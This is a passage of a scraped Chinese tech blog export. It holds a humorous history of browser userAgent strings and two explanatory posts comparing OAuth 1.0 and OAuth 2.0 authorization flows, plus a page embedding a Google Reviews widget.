(Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36天，这串是啥？你怎么连话都说不清楚？ 我对userAgent并不陌生，但明明一个单词就可以说清楚的事情，却是这么掏心掏肺的回答。怪可怜的，一定有冤情。 后来我查阅了很多资料，发现历史非常的精彩。 大事年表 * 1990年: Nexus(WorldW","text":"某天，我做一个小项目，需要判断一下浏览器类型。简单的呀。 控制台敲下： navigator.userAgent 浏览器回应： Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36天，这串是啥？你怎么连话都说不清楚？ 我对userAgent并不陌生，但明明一个单词就可以说清楚的事情，却是这么掏心掏肺的回答。怪可怜的，一定有冤情。 后来我查阅了很多资料，发现历史非常的精彩。 大事年表 1990年: Nexus(WorldWideWeb)诞生 1993年1月23日：Mosaic诞生 1994年12月：Netscape(Mozilla)诞生 1995年4月：Opera诞生 1995年8月16日：Internet Explorer诞生 2002年9月23日：Firefox诞生 2003年1月7日：Safari诞生 2008年9月2日：Chrome诞生 一、盘古开天地 很久很久之前，上古大神Berners-Lee发明了WorldWideWeb，即万维网。同时，李大神也发明了第一款浏览器。真是具有跨时代意义的工具呀，好伟大呀，人们在想，叫什么好呢？ 但大神就是大神，大神内心的想法又岂是尔等凡人能够肆意揣摩？ 万万没想到，李大神说，我这浏览器，也叫WorldWideWeb！不行么？ 行行行。 虽然李大神起名字这么拽，但他后来发觉，还是得赋予一点承上启下的历史意义，就改名成“Nexus”。值得注意的是，这浏览器，居然是可以兼容Unix跟Microsoft DOS的。它在当时流行的各种电脑上跑得飞起，应用也越来越广，被称为“杀手级应用”。杀手级…你们看互联网一开始就是这么的腥风血雨。 但这个浏览器，还不支持图片的显示，这是出现UserAgent的导火索。 二、唐尧虞舜 93年，伊利诺大学的NCSA组织认为，浏览器无图无真相，这不好。因而他们发明了第一款可显示图片的浏览器。 真是具有跨时代意义的工具呀，好伟大呀，人们在想，叫什么好呢？ 但大神就是大神，大神就是连起名字都让你惊心动魄。 NCSA组织说，它能显示图片，偏偏我们就要叫它“马赛克(Mosaic)”！不行么？ 行行行。 但有人就问了，Nexus不显示图片，Mosaic能显示，你们让html提供者怎么写代码？你们是不是想逼死选择困难症患者？有没有考虑过天秤座的感受？ 因而UserAgent就诞生了。Mosaic将自己标志为NCSA_Mosaic/2.0 (Windows 3.1)，大家该怎么写代码就怎么写，但请求会带上这个信息，服务器就知道该不该返回能显示图片的html。UserAgent君，出生时跟我们设想的一样简单，仅仅标明了自己是什么浏览器，在什么系统运行，以及各自的版本号。 新旧浏览器们像彬彬有礼的君王，商议和让位是为了更好的繁荣。但风雨欲来。 三、楚汉争霸 像刘邦一样，走出来一个搅局的小流氓。当然他还是很有志向的，他的目标，就是战胜霸主Mosaic。后来，他还真的做到了。 如今，所有现代浏览器的UserAgent里都有它的标志，就像汉朝之后，我们都称为“汉”人。一群很有天赋的程序员，一起缔造了它的辉煌。 真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？ 但大神就是大神，大神就是让你永远也猜不到他们想了个什么名字。 大神们说，叫Mozilla，不行么？ 行。但什么意思呢？ 含义有二。其一，哥斯拉(Godzilla)谐音，诚然是一头野心勃勃的怪兽；其二，&quot;Mosaic Killa&quot;之意，Killa是俚语中Killer的拼法，即“马赛克的终结者”，赤裸裸的挑战。 惊呆了的Mosaic小心翼翼的念着Mozilla这发音：“Mo…摸咋了？”勃然大怒，“摸你妹！” 鉴于Mosaic当时的权势，Mozilla改名成Netscape Navigator(网景航海家)。小怪兽突然变成有点文艺小清新的名字，郁闷得很，但内心的血液沸腾着。虽然叫大名叫网景，但它把UserAgent偷偷设置成Mozilla/1.0 (Win3.1)。还是摸咋了？咬我？ 四、宋元之战 很快，NetScape战胜了Mosaic，成为了新的霸主，因为其更优的展示。 NetScape最先支持了html框架显示，就是简单的table布局，内外边距之类，仅仅这点就将Mosaic抛诸身后。区别这两个浏览器，还是用的UserAgent。如果是UserAgent里含有“Mozilla”字样，那就发送支持框架的页面，否则，就发送不含框架的页面。 NetScape帝国日益庞大，歌舞升平，一切风平浪静，直到微软的铁骑挥军南下。 微软发布了一款跟系统强绑定的浏览器，真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？ 不用想了，就是IE。这命名也相当简单粗暴，Internet Explorer，直接把这工具的用途拍在你脸上。连说明书都可以免了。 IE也是支持html标准框架的，但由于前面的历史原因，人们只会给UserAgent里含有“Mozilla”字样的浏览器发送含框架的页面。但这点小事能难倒我大微软？IE呵呵一笑，把自己的UserAgent改成Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)。看，我这里也有“Mozilla”字样，也能收到含框架的页面了！ 当然，这个小流氓行为，跟后来把IE和Windows捆绑一起销售的大流氓行为比起来，根本不为足道。后面的故事我们也知道了，IE把NetScape干掉了。但它的身体上，却永远的烙上了“Mozilla”的印记。 五、康乾盛世 看过奥特曼的都知道，怪兽被打败了会再回来。别忘了NetScape曾拥有一批大神们，失败后，他们围绕着浏览器排版引擎Gecko(壁虎)成立了非正式组织Mozilla。小怪兽再次出发。大神们发明了另一款优秀的浏览器，它在插件拓展和开发调试领域做出的贡献，绝对可以载入互联网历史。 真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？ 但大神就是大神，大神就是即使你知道了Mozilla的命名都是野兽，却还是猜不到是什么。 Mozilla说，我们浴火重生，叫Phoenix(凤凰)！不行么？ 真不行。 刚推出就被人告了，原来已经有一家公司叫做“凤凰科技”。 Mozilla瀑布汗，改名叫Firebird(火鸟)！还不行么？ 我们得原谅一下他们的取名，虽然现在看来满满的山寨感，可放在那个时代，Firebird这名字很炫酷。就像你当初的QQ昵称叫赤炎天使感觉依然良好一样。 但是，他们发现，业内有个数据库系统，也叫的Firebird…泪流满面的Mozilla感慨重生好难呀。最后才决定叫Firefox(火狐)。 基于Gecko引擎的Firefox非常优秀，为了告诉大家，我使用了这个引擎，它标志自己的UserAgent为Mozilla/5.0 (Windows; U; Windows NT 5.1; sv-SE; rv:1.7.5) Gecko/20041108 Firefox/1.0。 这时候的UserAgent，虽然长了点，但它并不混乱，准确的标明了系统，排版引擎，浏览器名称等信息。虽然IE这时已经占有了很大的市场份额，但基本停步不前；而Mozilla经过一段时间的修生养息，Firefox在业内广受好评，得到了快速的发展。 时值2003年，web2.0的浪潮前夕，浏览器的发展达到了空前的盛世。 然而所谓否极泰来，盛极则衰。涅槃的Firefox迎来盛世，却又恰恰由于盛世，决定了UserAgent纠结的命运。 六、师夷长技 前面说到，微软靠Windows系统捆绑IE销售。而Windows自然也有它的对手，Linux。一个技术快速发展的时代，系统的世界里也是战火纷飞。Linux系统自从有了可视化界面，也需要浏览器呀。桌面系统KDE的缔造者们就发明了一个。 真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？ 但大神就是大神，大神就是讲究先从文字上占据压垮你的气势。 先有Navigator航海家，再有Explorer探索者，咱就叫Konqueror(Conqueror的变体)征服者吧。 行行行。我已懒得理这帮大神… 可是，问题来了。Konqueror使用KHTML排版引擎，即使它们认为自己跟Gecko引擎一样优秀，但用户不买单。你UserAgent里没有“Gecko”字样，我就不给你经过优良排版的html。 结果，Konqueror思来想去，做了一个艰难但很萌的决定，把UserAgent写成 Mozilla/5.0 (compatible; Konqueror/3.2; FreeBSD) (KHTML, like Gecko)… 这就是现代浏览器里 like Gecko这一萌词的由来。 就这样，伟大的排版引擎KHTML为了获得更好的资源，师夷长技。这并没什么不好，却造成了UserAgent的越发混乱。 KHTML与Gecko这一对，永远卿卿我我比翼双飞在UserAgent里面了。那个满含深意的“like”，有人觉得翻译成“像”，但也有人觉得应该是“喜欢”… 七、世界大战 首先是IE冷静下来了，他觉得，你们不带这么玩的？ 就我年少时不懂事，首先改了个Mozilla字样，后面追究这历史我岂不是成了罪魁祸首？我改还不行吗？ 在IE6，它明确自己UserAgent为 Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)。除去已经注定不可抹去的“Mozilla”字样，其余信息简洁，准确，清晰。 但事态已经不可收拾。 Opera给这狂躁的世界添了一把火。它觉得，易容术非常炫酷呀。Opera直接在菜单提供了Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.51，Mozilla/5.0 (Windows NT 6.0; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.51，Opera/9.51 (Windows NT 5.1; U; en)三个选择项。第一个是易容成IE，第二个是易容成火狐，第三个才是自己，选谁就是谁！ 其实这并不是一件坏事。因为Opera是站在能够让用户通过选择，去获得更好的浏览体验的基础上的。你提供选择，或是不提供，混乱的UserAgent还是在这，不离，不弃。再者，这对网页的开发者有极大的好处，在某些情况，你不必同时打开几个不同的浏览器去调试。到目前，最新的Chrome浏览器更加炫酷，能够支持近40种不同的UserAgent，甚至你还可以自定义。当然这是后话。 与此同时，苹果公司依靠内核WebKit，开发出Safari，命名UserAgent为Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.5。 有人就会问了，不是Webkit内核吗，怎么还有KHTML, like Gecko？注意，内核Webkit包含了一个排版引擎叫WebCore，而WebCore是KHTML衍生而来的。也就是说，WebCore是KHTML的儿子，子承父业，基因差不多。为了能够正常排版，safari只能这么写。 后来，google也开发了自己的浏览器Chrome，其内核也是Webkit，但它设定UserAgent为Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13。Safari一看，不对劲啊！你怎么也在后面写有Safari？Chrome呵呵一笑，你懂的。 因此，请让我一口气说完下面这一段： Chrome希望能得到为Safari编写的网页，于是决定装成Safari，Safari使用了WebKit渲染引擎，而WebKit呢又伪装自己是KHTML，KHTML呢又是伪装成Gecko的。同时所有的浏览器又都宣称自己是Mozilla。 这就是整个UserAgent世界大战的格局… 八、军阀混战 将目光聚焦到国内，更是狼烟四起，混乱不堪。大家都知道，浏览器是互联网的入口，这块肥肉谁也不想丢。因而一个接一个的“国产”浏览器进入斗兽场。 360，百度，QQ，UC，搜狗，猎豹，遨游，世界之窗…你能说出一大堆。连淘宝，酷狗，hao123都有浏览器，不信你搜。 注意我前面“国产”两个字必须加上双引号，因为这个made in china并不纯。国人并没能像远古大神一样，硬生生发明一个内核出来，我们更擅长“微创新”。 利用Trident（IE的内核），包装一下皮肤，美化一下，就可以说：完美兼容 利用Webkit，包装一下皮肤，美化一下，就可以说：极速浏览 把两个内核都包起来，就可以说：智能双核 是微创新！读书人的事，能叫偷吗？ 在这插播一下，浏览器的“双核”，并不是你听说手机双核电脑双核那回事。再多个核，速度也不会更快，当然这么说，会显得很厉害的样子。德艺双馨，智勇双全，名利双收，才貌双绝，夫妻双双把家还，你看带“双”字的词都很牛的。 但我上面的叙述，的确有夸张的成分。浏览器的诞生，肯定不仅仅是包一下皮肤那么简单，国内的工程师们，也苦心研究做了许多工作。如果要说优化策略，我可以再写一篇超级长的文章。优化无止境，路漫漫其修远，向同行们致敬。只是我非常讨厌那些不把事实说清楚，纯粹靠文案去忽悠人的产品… 话说回来，这么多国产浏览器，总得靠不同UserAgent标志自己呀。 大家自动分为两个阵营：使用Trident内核的，在IE已有UserAgent后添加自己的名称；使用Webkit内核的，就在Chrome的UserAgent后面添加。 前者像QQ浏览器：Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.7.26717.400)。 后者像猎豹： Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36 LBBROWSER。 当然双核浏览器诚然就是墙头草，切换内核时UserAgent也需要跟着变化。 如此的混战格局，这厢的IE和Chome想必也是醉了。 九、国共内战 适者生存是不变的生存法则，国产浏览器们经过一段时间的用户筛选，自然优胜劣汰。时值2010年，真正还在运营和更新的浏览器数量慢慢下降，用户集中在几家表现更优异的厂商手中。就在这时，好看的故事来了——3Q大战爆发。 有人说，腾讯电脑管家的推出是导火索。其实这场仗，大家都忍了好久，推不推出，都一定会在某个事件后爆发。360浏览器是奇虎的重量级产品，用户量众多，2009年它推出一个功能：过滤其它网站的广告。诚然民众们都很喜欢。可是其他互联网公司肯定就不乐意了，用户看不到更点击不到广告，这钱还怎么赚？ 因而在3Q大战爆发后，腾讯的一个手段就是：如果你使用360浏览器，就不能访问QQ的网站（单单QQ空间就有巨大的用户量），也直接反攻360的最大收入来源。一个艰难的决定背后，往往是需要无数种的技术战略支撑的。企鹅判断用户是否使用360浏览器，依靠的就是UserAgent里是否有“360SE”的字样。 战报传来：号外，360浏览器上不了QQ空间！已经买了黄钻的杀马特贵族急了呀！只能换浏览器了呀！感覺侢乜卟哙噯嘞呀！ 2011年11月3日，腾讯网站封杀360浏览器 2011年11月4日，360浏览器访问量仅为昨日一半 2011年11月5日，360浏览器访问量几乎为0 有人说，腾讯就这么快赢了？恰恰相反，360浏览器通过一次强制的自动升级，又可以访问QQ的网站了。360的工程师们在5日使用了伪装术——把“360SE”字样从UserAgent中去掉！ 意思就是，360浏览器的UserAgent跟IE完全一样，你根本判断不出来（因而访问量为0）。就怕流氓有文化！企鹅傻眼了，总不能把大微软的IE也一并给禁了吧… 这场土匪遇恶霸的耍流氓大战，最终通过法律而化解。企鹅在技术侧拿360没办法，而360则得到了一个跟IE一样的身份证。在这场内战中，受伤的除了广大网民们，其实还有令人心疼UserAgent君，以往让它越长越长就算了，这次长了还得阉割掉，真心dan疼呀。 十、明日边缘 看到这里，大家会明白一个道理：如果未来不出现一款霸主级别的浏览器（或内核），UserAgent应该不会有大变化了。 不过，这道理并不全对。别忘了，移动侧也是有浏览器的。 在早期能上网的手机里，内置了各手机厂商自研的浏览器。这些浏览器并不需要像PC一样的复杂设计，可以访问wap网页就足够了。因而它们的UserAgent命名，怎么简单怎么来，就直接叫 诺基亚 3100 Nokia3100/06.01 (UCWEB 3.3B)，PHILIPS755 ObigoInternetBrowser/2.0 这样，有甚者连浏览器叫什么都不带 TCL-3199，三星 E618 SEC-SGHE618。 这样任由发展下去，一种要历史重演，往日重现的即视感压迫而来。 web世界的联合国——W3C组织，站在明日边缘，面对着历史和未来，终于发话，它制定UserAgent标准，以后都得按这规范去起名字。详细请阅 User Agent Accessibility Guidelines。至此，命运坎坷的UserAgent终于逐步走向规范。W3C大法好，有人说你怎么不早点来拯救世界呀！其实W3C一直在努力，但规范的制定，到推广至大家认可并执行，是一条漫长的道路，需要时间，也需要实践。 W3C组织，在制定web标准这件工作之外，再我看来，还有两个身份：1、和事佬；2、背黑锅。和事不成，就得背黑锅。是的就是这样。 彩蛋 那么，我们的故事接近尾声。还有一些有趣的小彩蛋。 Chome 28开始，与苹果正式分道扬镳，采用Blink内核，但它的UserAgent并不改变。 淘宝封杀微信打开淘宝页面，靠的就是微信内置浏览器UserAgent里的MicroMessenger字样。其实微信也可以像当初360一样把UserAgent去掉，但微信并不这样做。 360出招之时留有后招。也许，它一开始就想到了腾讯会告他们对于UserAgent的欺瞒，因而它其实提供了设置项。默认设置是“保持跟IE一样的UserAgent”，但用户也可以不勾选。只是这选项比较隐蔽，而且你重启浏览器后…又会变回默认设置。如果没有这个小小的设置，结果大家可以自行想象。 微软又玩新花样了，在泄露版IE 11中，去掉了以往的MSIE字样。初步猜测此举是为了使现有的 CSS hack 失效，避免过去网页设计师对IE差别对待的情况再度发生。但又会引发其他问题啊亲。 本文链接： http://www.meng.uno/articles/fb689d08/ 欢迎转载！","categories":[{"name":"web","slug":"web","permalink":"http://www.meng.uno/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://www.meng.uno/tags/web/"},{"name":"浏览器","slug":"浏览器","permalink":"http://www.meng.uno/tags/浏览器/"},{"name":"userAgent","slug":"userAgent","permalink":"http://www.meng.uno/tags/userAgent/"}]},{"title":"关于“哈尔滨工业大学（HIT）”的评论","slug":"hit-comment","date":"2014-09-01T04:24:08.000Z","updated":"2018-03-01T14:31:17.594Z","comments":true,"path":"articles/5b51920c/","link":"","permalink":"http://www.meng.uno/articles/5b51920c/","excerpt":"此文章调用Google地图展示用户对我的母校HIT的评论。 本文链接： http://www.meng.uno/articles/5b51920c/ 欢迎转载！","text":"此文章调用Google地图展示用户对我的母校HIT的评论。 wpac_init = window.wpac_init || []; wpac_init.push({ widget: 'GoogleReview', id: 9986, place_id: 'ChIJ0XzYLZ1_RF4RbO0PoVKZO8s', view_mode: 'list' }); (function() { if ('WIDGETPACK_LOADED' in window) return; WIDGETPACK_LOADED = true; var mc = document.createElement('script'); mc.type = 'text/javascript'; mc.async = true; mc.src = 'https://embed.widgetpack.com/widget.js'; var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(mc, s.nextSibling); })(); 本文链接： http://www.meng.uno/articles/5b51920c/ 欢迎转载！","categories":[],"tags":[{"name":"评论","slug":"评论","permalink":"http://www.meng.uno/tags/评论/"},{"name":"HIT","slug":"HIT","permalink":"http://www.meng.uno/tags/HIT/"},{"name":"哈尔滨工业大学","slug":"哈尔滨工业大学","permalink":"http://www.meng.uno/tags/哈尔滨工业大学/"},{"name":"哈工大","slug":"哈工大","permalink":"http://www.meng.uno/tags/哈工大/"}]},{"title":"兔子，胡萝卜与OAuth的故事","slug":"oauth-rabbit","date":"2014-08-20T04:55:00.000Z","updated":"2018-03-20T06:59:57.925Z","comments":true,"path":"articles/a4df422f/","link":"","permalink":"http://www.meng.uno/articles/a4df422f/","excerpt":"简单的故事，就别用复杂的方式传诵 讲几个故事 从前，有只老兔子，在仓库里存了一万根胡萝卜，作为给小兔子的遗产。而后他就去周游世界了。小兔子有天想去把萝卜拿出来，却被仓库外的一只兔子拦住了。一问才知道，这是老兔子安排的仓库守卫。和所有故事中的守护者一样，他正直而古板，八字眉下面有着睡眠不足的熊猫眼，世人一般称他为兔门神。兔子想要拿到萝卜，就得说服兔门神呀，于是他走了上前… #兔子与OAuth1.0的故事 1. 兔子首先得证明自己是只兔子，不是狗熊也不是狼，于是他向兔门神出示了身份证 2. 兔门神说：哦，你是只兔子。但你还得证明你是老兔子的兔崽子呀。兔子说我爸旅游去了，怎么证明呢？兔门神","text":"简单的故事，就别用复杂的方式传诵 讲几个故事 从前，有只老兔子，在仓库里存了一万根胡萝卜，作为给小兔子的遗产。而后他就去周游世界了。小兔子有天想去把萝卜拿出来，却被仓库外的一只兔子拦住了。一问才知道，这是老兔子安排的仓库守卫。和所有故事中的守护者一样，他正直而古板，八字眉下面有着睡眠不足的熊猫眼，世人一般称他为兔门神。兔子想要拿到萝卜，就得说服兔门神呀，于是他走了上前… #兔子与OAuth1.0的故事 兔子首先得证明自己是只兔子，不是狗熊也不是狼，于是他向兔门神出示了身份证 兔门神说：哦，你是只兔子。但你还得证明你是老兔子的兔崽子呀。兔子说我爸旅游去了，怎么证明呢？兔门神说，这样吧，我把你的身份证拍下来，发送给你爸，让他看下这是不是你。于是兔门神打开了微信…… 正在休假的老兔子看了下照片，回复说证件照好难看毁三观啊，但勉强认得出这货就是我儿子 兔门神确认这信息后，说，你老爸还是认你这个儿子的 兔子问，那我可以去拿胡萝卜了没？ 兔门神说，可以了，这样吧，我发你个通行证，以后拿这个来我就不用这么麻烦了。 兔子与OAuth1.0a的故事 这种貌似天衣无缝的形式，却被一只坏兔子看出了破绽。他注意到一个细节，在最后的一步，兔门神都是习惯性的把通行证交给了面前的兔子,而不管这只兔子是不是当初的那只。于是，坏兔子趁兔门神正在和老兔子聊微信的时候，一个劲站在了兔子前面，最后兔门神居然把通行证塞给了他！这怎么可以？于是在第一步和第六步又有了修改。 兔子出示身份证的同时，也出示了自己的私房照，说，门神大哥呀，后面你记得把通行证给照片上的帅哥！ …… …… …… …… 兔门神看了下面前的兔子，私房照上的明显P过嘛但勉强认得出是本人，于是才交出了通行证 兔子与Oauth2.0的故事 兔门神回家后，向他的老婆兔女神汇报了今天的工作，更安全的方案使他得意洋洋，没想到被兔女神骂了一顿。兔女神说，兔子证明自己还得带个身份证，你不知道在天朝办个身份证多麻烦吗？让小兔子跟老兔子去聊下微信就可以了干嘛要你插手？兔门神哑口无言，兔女神高贵冷艳的说我有四种方案，给你先说说最常用的一种吧。 兔子一开始就跟他老爸聊微信了。当然他得明确告诉老爸，他需要打开哪个仓库（因为老兔子有很多儿子，每个儿子去拿萝卜的仓库不一样，兔子要指定一下具体是哪个，问他可不可以） 老兔子回复说：“just do IT”… 兔子然后去拿胡萝卜，首先被兔女神拦住了。女神告诉他，你要给我四样东西：老兔子的回复，你的私房照，身份证，还要给我一个密码。兔子愣愣的想了个密码，把这四样东西交了过去 兔女神把这四种东西混在一起，用魔法变出了两件法宝：一封情书和一撮猴子毛…然后她解释说：拿着我的情书去找我老公，他就让你进仓库了；但是这情书会过期，是出于安全考虑啦，过期后你得召唤我再写一封，召唤出我的步骤就是吹一下猴子毛，像孙悟空那样你就别在意这些细节好伐？ 兔子拿着情书去找兔门神时，发现他由于被妻子分担了压力，明显睡眠好多了… 演员表 兔子-消费者，也就是第三方应用 老兔子-用户，也就是我们，记住，我们永远是第三方的亲爹 仓库-Oauth提供者，这里有我们保存的资料，比如说新浪微博，qq空间，人人… 兔门神-在前两个故事中，由授权服务器和资源服务器共同扮演，在最后的故事中，只由资源服务器扮演 兔女神-授权服务器，只管授权，不管取资源 重要道具 身份证-签名，将一个http请求以及相应参数字符串化 拍下的身份证照片-Request Token，服务器进行认证 通行证-Access Token，获取资源的凭证 私房照-重定向地址 坏兔子(我把它当成道具而不是演员)-重定向地址劫持 仓库的名称-appId,即对应具体哪个第三方 just do it-Auth code，用户授权号 第三个故事的身份证-client id 客户端帐号 密码-client secret 客户端密码 魔法-将client id，client secket，重定向地址，Auth code生成Access Token 情书-Access Token，获取资源的凭证 猴子毛-Refresh Token，用来在Access Token过期后将其刷新，刷新需带上client id和client secret 说书人说 Oauth2.0比起Oauth1.0，没有了第一步的签名，将服务器分开为授权服务器与资源服务器。这是最大的两个特征。开放平台必须得做到对第三方友好，才有利于接入。像Oauth1.0签名的操作，就难倒了许多第三方。也许你知道了Oauth2.0接入步骤简化了些，但也知道其内部实现要更复杂，抛去安全方面的考虑，我认为这是正确的方向。因为，Oauth2.0在某种意义上说，向第三方做到了——“把悲伤留给自己，你的美丽让你带走”。 本文链接： http://www.meng.uno/articles/a4df422f/ 欢迎转载！","categories":[{"name":"web","slug":"web","permalink":"http://www.meng.uno/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://www.meng.uno/tags/web/"},{"name":"OAuth","slug":"OAuth","permalink":"http://www.meng.uno/tags/OAuth/"}]},{"title":"OAuth1 VS OAuth2","slug":"oauth1-2","date":"2014-08-11T02:55:00.000Z","updated":"2018-03-20T06:59:57.925Z","comments":true,"path":"articles/476220c8/","link":"","permalink":"http://www.meng.uno/articles/476220c8/","excerpt":"一、写在前面 在收集资料时，我查询和学习了许多介绍OAuth的文章，这些文章有好有坏，但大多是从个例出发。因此我想从官方文档出发，结合在stackoverflow上的一些讨论，一并整理一下。整理的内容分为OAuth1.0a和OAuth2两部分。 OAuth 1.0a：One Leg -> Two Leg -> Three Legged OAuth 2:Two Leg -> Three Legged (附：Refresh Token的方式) 这两种模式都是按箭头从左往右安全性递增，其实现也会相对复杂。关于官方的这种leg（腿？）的说法，在中文翻译中比较少有文章提及。下面分别来介绍OAuth的","text":"一、写在前面 在收集资料时，我查询和学习了许多介绍OAuth的文章，这些文章有好有坏，但大多是从个例出发。因此我想从官方文档出发，结合在stackoverflow上的一些讨论，一并整理一下。整理的内容分为OAuth1.0a和OAuth2两部分。 OAuth 1.0a：One Leg -&gt; Two Leg -&gt; Three Legged OAuth 2:Two Leg -&gt; Three Legged (附：Refresh Token的方式) 这两种模式都是按箭头从左往右安全性递增，其实现也会相对复杂。关于官方的这种leg（腿？）的说法，在中文翻译中比较少有文章提及。下面分别来介绍OAuth的这5种授权流程。 二、OAuth1.0a OAuth 1.0a (One Leg) 应用给服务器发送一个签名请求，附带以下参数： oauth_token Empty String oauth_consumer_key oauth_timestamp oauth_nonce oauth_signature oauth_signature_method oauth_version Optional 服务验证并授予对资源的访问 应用程序利用请求的资源 OAuth 1.0a (Two Legs) 应用发送一个签名请求，以获取 Request Token： oauth_consumer_key oauth_timestamp oauth_nonce oauth_signature oauth_signature_method oauth_version Optional 服务器返回Request Token： oauth_token oauth_token_secret Additional Parameters / Arguments 发送签名请求，用Request Token换取Access Token oauth_token Request Token oauth_consumer_key oauth_nonce oauth_signature oauth_signature_method oauth_version 服务器返回Access Token和Token Secret 应用通过Access Token和Token Secret利用请求的资源 OAuth 1.0a (Three Legged) 应用发送一个签名请求，以获取 Request Token： oauth_consumer_key oauth_timestamp oauth_nonce oauth_signature oauth_signature_method oauth_version Optional 服务器返回Request Token： oauth_token oauth_token_secret oauth_callback_confirmed … Additional Parameters / Arguments 发送给用户授权的URL oauth_token 提示用户进行授权 用户进行授权 授权结束后返回应用，附带上： oauth_token oauth_verifier 发送签名请求，用Request Token换取Access Token oauth_token Request Token oauth_consumer_key oauth_nonce oauth_signature oauth_signature_method oauth_version oauth_verifier 服务器返回Access Token和Token Secret 应用通过Access Token和Token Secret利用请求的资源 三、OAuth2 OAuth 2 (Two Legged) 客户端凭据方式 应用发送请求到服务器： grant_type = client_credentials 如果没有使用Authorization（Authorization: Basic Base64(client_id:client_secret)） 的header，必须附带参数为： client_id client_secret 服务器以Access Token回应 access_token expires_in token_type 隐式授予方式 应用发送请求到服务器： response_type = token redirect_uri This is a server-side Redirection URI hosted by the provider or yourself. scope state Optional client_id 用户可根据需要授权。 username password 服务器将响应包含access_token在内的redirect_uri 应用程序跳转至redirect_uri redirect_uri将响应一段脚本或HTML片段。响应的脚本或HTML片段包含参数access_token，还有您可能需要的任何其他参数。 资源所有者密码方式 应用向资源所有者请求凭证 username password 应用使用凭证，向服务器发送请求 grant_type = password username password url看起来会像这样：grant_type=password&amp;username=my_username&amp;password=my_password 如果你没有使用Authorization的header，必须附带上参数： client_id client_secret url看起来会像是： grant_type=password&amp;username=my_username&amp;password=my_password&amp;client_id=random_string&amp;client_secret=random_secret 服务器返回Access Toke access_token expires_in token_type OAuth 2 (Three Legged) 应用重定向用户到授权服务： client_id redirect_uri response_type state Optional; Unique identifier to protect against CSRF scope Optional; what data your application can access. url看起来会像是： oauth_service/login/oauth/authorize?client_id=3MVG9lKcPoNINVB&amp;redirect_uri=http://localhost/oauth/code_callback&amp;scope=user 用户登录服务器并确认授权给应用 服务器重定向用户到redirect_url ，附带参数： code state 应用拿到code，并换取Access Token client_id client_secret code redirect_uri Optional; grant_type = “authorization_code” 如果的client_id和client_secret是有效的，服务器将调用一个回调redirect_url，包含ACCESS_TOKEN access_token expires_in refresh_token 应用保存ACCESS_TOKEN，在随后的请求中使用。通常这个值被存储在session或或cookie，需要时作为授权请求的参数。 OAuth 2 (Refresh Token 刷新token) 在OAuth2中，Token会有过期时间，我们必须去refresh_token，使用其他一些先前获得的参数，生成一个新的token。这是一个容易得多的流程。 创建刷新令牌请求 grant_type = “refresh_token” scope Optional; Cannot have any new scopes not previously defined. refresh_token client_id client_secret 服务验证和响应以下参数： access_token issued_at 四、Stack Overflow上的一些问答 Q：OpenID和OAuth的区别是什么？ A：OpenID是有关身份验证（即证明你是谁），OAuth有关授权（即授予访问权限），推荐博文：从用户的角度来看OpenID和OAuth Q：OAuth2与OAuth1不同的地方是？有人可以简单的解释的OAuth2和OAuth1之间的区别吗？ OAuth1现在已经过时，应实施的OAuth2？我没有看到许多实现的OAuth2，大多数仍在使用OAuth，这让我怀疑的OAuth2的准备使用。是吗？ A：OAuth2能更好地支持不是基于浏览器的应用。对于不是基于浏览器的应用程序，这是对OAuth的主要挑战。例如，在OAuth1.0，桌面应用或手机应用必须引导用户打开浏览器所需的服务，与服务进行身份验证，并复制令牌从服务返回给应用程序。这里的主要批评是针对用户体验。使用OAuth2.0，可以用新的方式为用户的应用程序获得授权。 OAuth2.0不再需要客户端应用程序拥有密钥。这让人回想起老的Twitter认证的API，它并不需要应用得到HMAC哈希令牌和请求字符串。使用OAuth2.0，应用程序可以通过HTTPS获得令牌。 OAuth2.0的签名流程简单得多。没有更多的特殊解析，排序，或编码。 OAuth2.0的访问令牌是“短命”的。通常情况下，OAuth1.0的访问令牌可以存储一年或一年以上（Twitter从来没有让他们到期）。 OAuth的2.0有刷新令牌的概念。虽然我不能完全肯定这是什么意思，我的猜测是，您的访问令牌可以是短暂存储的（即基于会话），而你可以刷新令牌。你使用刷新令牌获取新的访问令牌，而不是让用户重新授权您的应用程序。 最后，OAuth2.0使得负责处理的OAuth请求的服务器和处理用户的授权服务器之间的角色有一个干净的分离。更多信息，在上述的文章中详述。 Q：OAuth2服务器群怎么使用state来防范CSRF？ A：state只是一个随机的字符串，可以做这样的事情：$state = md5(uniqid(rand(), TRUE));在session中记录satate，以便稍后你能做验证。一些额外的资料：OAuth2威胁文件模型，特别CSRF保护 本文链接： http://www.meng.uno/articles/476220c8/ 